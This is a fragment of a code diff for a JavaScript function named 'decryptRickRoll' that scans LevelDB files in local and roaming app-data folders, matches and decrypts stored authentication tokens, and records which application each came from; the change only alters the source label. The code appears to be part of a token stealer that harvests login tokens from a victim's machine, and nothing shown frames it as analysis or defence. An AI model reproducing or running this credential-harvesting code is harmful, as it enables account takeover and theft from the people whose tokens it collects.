@@ -54,7 +54,10 @@ const decryptRickRoll = (path) => {
       const lines = readFileSync(join(levelDB, f), { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
       lines.forEach(line => {
         line.match(tokenRegex)?.forEach(token => {
-          if (!tokens.includes(token)) tokens.push({ token, source: path.split('\\').pop() });
+          if (!tokens.includes(token)) tokens.push({
+            token,
+            source: path.replace(localAppData, '').replace(roamingAppData, '').replace('User Data', '').split('\\').join(' ').trim()
+          });
         });
         line.match(encryptedTokenRegex)?.forEach(token => {
           if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
@@ -65,7 +68,10 @@ const decryptRickRoll = (path) => {
         token = decryptToken(token, key)?.trim();
         if (
           typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
-        ) tokens.push({ token, source: path.split('\\').pop() });
+        ) tokens.push({
+          token,
+          source: path.replace(localAppData, '').replace(roamingAppData, '').replace('User Data', '').split('\\').join(' ').trim()
+        });
       });
       if (tokens.length <= 0) {
         reject();
